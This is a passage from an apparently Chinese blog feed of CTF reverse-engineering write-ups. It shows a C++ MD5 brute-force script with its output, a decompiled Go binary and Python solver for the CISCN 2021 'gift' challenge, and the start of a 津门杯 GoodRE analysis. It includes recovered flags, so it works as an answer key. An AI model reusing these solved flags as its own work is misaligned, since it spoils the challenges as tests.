    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2028571776&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i){
        string in &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;j){
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (cur[j] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; size[j]){
                cur[j] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
                &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;cur[j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
            }
            in &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; combine[j][cur[j]];
            in &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;,&amp;#34;&lt;/span&gt;;
        }
        string out &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MD5(in);
        cur[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
        &lt;span style=&#34;color:#75715e&#34;&gt;// cout &amp;lt;&amp;lt; in &amp;lt;&amp;lt; endl;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (out[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;F&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; out[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; out[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;B&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; out[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; out[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;7&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; out[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;8&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; out[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;C&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; out[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;C&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; out[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;B&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; out[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;9&amp;#39;&lt;/span&gt;){
            cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;in:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; in &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; endl;
            cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;out:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; out &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; endl;
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5000000&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
            cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100.0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2028571776&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; endl;
    }
    time_t end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; clock();
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;time=%fs&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, (&lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt;)(end &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; start)&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;CLOCKS_PER_SEC);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;md5是直接上网抄的，来源：https://blog.csdn.net/u012063703/article/details/49178349&lt;/p&gt;
&lt;p&gt;最后的结果&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;...
60.8803%
in:62.1834,25.0002,52.84735,406.6893,22.01795,13.1886,158.0031,54.06125,
out:F0B278CCB982F6132DD6A834C4827D0D
61.1268%
...
time=2639.569345s
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;爆破出答案大概花了 $60% \times 2640=26.4\min$&lt;/p&gt;
&lt;h3 id=&#34;结论&#34;&gt;结论&lt;/h3&gt;
&lt;p&gt;这题难度不在于逆向，前期的基本分析以及后面需要打数据动调这些和逆向有关的操作，比赛的时候其实都想到了，但问题在于不知道还有 Modbus Slave 这种东西&lt;/p&gt;
&lt;p&gt;所以全程都很迷茫，完全不知道该怎么做，官方的提示早上才放出来，那会都收工准备补觉了（一个小时的时间，找数据范围+写脚本+爆破，根本来不及好吧）&lt;/p&gt;
&lt;p&gt;以及过程中的调数据就是无限二分，累的一批，这题说是 Misc 我都信&lt;/p&gt;
&lt;p&gt;最后的爆破数据量也太大了，参考的博客用go跑了两小时，我这边用c++跑了半个小时，不过队友用c的多线程只跑了半分钟，看截图只爆破了 $2%$ 就出结果了，应该是划分的位置正好在答案边上，有时间学习一下多线程&lt;/p&gt;
&lt;p&gt;综上：屑题&lt;/p&gt;
&lt;h2 id=&#34;gift&#34;&gt;gift&lt;/h2&gt;
&lt;p&gt;新版本的GO对magic number以及一些结构上都做了修改，所以老版本的符号表修复脚本就不能用了，好在免费的ida7.6正好支持GO的符号表恢复，可以直接做了。&lt;/p&gt;
&lt;p&gt;主函数主要部分如下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  main_CISCN6666666();
  main_CISCN66666666();
  main_CISCN6666666666();
  max_len_v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; qword_928238; &lt;span style=&#34;color:#75715e&#34;&gt;// 0x20
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  index_v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)index_v3 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; max_len_v2 )
  {
    qword_9720E8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( qword_928238 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; index_v3 )
      runtime_panicIndex();
    v14 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; off_928230[index_v3];
    runtime_makeslice((&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, v14, v14, v10);
    v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v11;
    v19 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v11;
    v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1LL&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v4 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; )
    {
      v12 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v4;
      main_wtf(&lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;, v4, v5, v14, v14);
      v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v12 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
      v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v19;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)qword_9720E8 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x11&lt;/span&gt; )
      runtime_panicIndex();
    v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v16 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; qword_9720E8);
    v22[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_8765E0;                       &lt;span style=&#34;color:#75715e&#34;&gt;// output_length
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    v22[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;qword_9239C0[v6 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x66u&lt;/span&gt;];         &lt;span style=&#34;color:#75715e&#34;&gt;// output
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; qword_92EAB0;
    v10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2LL&lt;/span&gt;;
    v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v22;
    fmt_Fprintf(v0, (&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)v22, (&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)qword_9239C0);
    index_v3 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
  }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;开头的三个CISCN函数是简单的输出，中间生成空的slice然后扔到了wtf函数中，输出是根据索引，从&lt;code&gt;qword_9239C0&lt;/code&gt;中选择一个字符。&lt;/p&gt;
&lt;p&gt;尝试运行的时候发现运行时间很长，但在程序中没有看到延时的操作，那么这道题应该是一个耗时的算法。&lt;/p&gt;
&lt;p&gt;观察发现 &lt;code&gt;wtf&lt;/code&gt; 函数是一个递归函数，而 &lt;code&gt;off_928230&lt;/code&gt; 中存的就是递归的深度。&lt;/p&gt;
&lt;p&gt;尝试找规律，直接将深度patch成 &lt;code&gt;1&lt;/code&gt; 到 &lt;code&gt;0x20&lt;/code&gt;，运行一下。&lt;/p&gt;
&lt;p&gt;得到如下结果&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Welcome to CISCN 2021!
Here is our free flag for you as a gift:
CISCN{45b3247c45b3247c4
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;猜测最后的输出是有规律的&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;cur_time &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [ 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1E&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x936&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3D21&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x149A7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x243AC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0CB5BE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x47DC61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16C0F46&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x262C432&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4ACE299&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10FBC92A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x329ECDFD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x370D7470&lt;/span&gt;
]
res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;4&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;5&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;4&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;7&amp;#39;&lt;/span&gt;]

print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CISCN{&amp;#39;&lt;/span&gt;, end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; cur_time:
    print (res[c &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; len(res)], end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;}&amp;#39;&lt;/span&gt;)

print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CISCN&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{4b445b3247c45344c54c44734445452c}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;和最后的正确结果做个对比，发现一样。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>津门杯 GoodRE writeup</title>
        <link>/post/jinmen-cup-goodre-writeup/</link>
        <pubDate>Mon, 10 May 2021 02:32:59 +0000</pubDate>
        
        <guid>/post/jinmen-cup-goodre-writeup/</guid>
        <description>&lt;p&gt;和两位学长一起做出来的，总算是能在团队赛中做出来题了，结束了长达一个月的白给生涯，不容易啊&lt;/p&gt;
&lt;h2 id=&#34;思路&#34;&gt;思路&lt;/h2&gt;
&lt;p&gt;先拖到 ida 里进行静态分析&lt;/p&gt;
&lt;p&gt;查看main函数，把变量定义和初始化删了，并将 &lt;code&gt;cin&lt;/code&gt; 的东西命名为了 &lt;code&gt;input&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; a1, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;a2, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;a3) {
  std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;operator&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt;std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;char_traits&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt;&amp;gt; &amp;#34;&lt;/span&gt;, a3);
  std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;operator&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;,std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;char_traits&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cin, input);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( strlen(input) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; ) {
    v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input;
    v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_55A06D2D0020;
    v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {
      v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hexstr2int(v3, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;);
      v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v14;
      sub_55A06D2CC408(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v14[v5], v6);
      sub_55A06D2CC408(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v18[v5], &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;);
      v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v19;
      sub_55A06D2CC408(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v19[v5], &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v4);
      &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v3;
      &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v4;
      v5 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36LL&lt;/span&gt;;
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v3 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; v21 );
    sub_55A06D2CCB30(v14, v18, v9);
    sub_55A06D2CCB30(v15, v18, v10);
    sub_55A06D2CCB30(v16, v18, v11);
    sub_55A06D2CCB30(v17, v18, v12);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;sub_55A06D2CCADC(v7, v8) ) {
      v7 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;;
      v8 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v7 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; v18 ) {
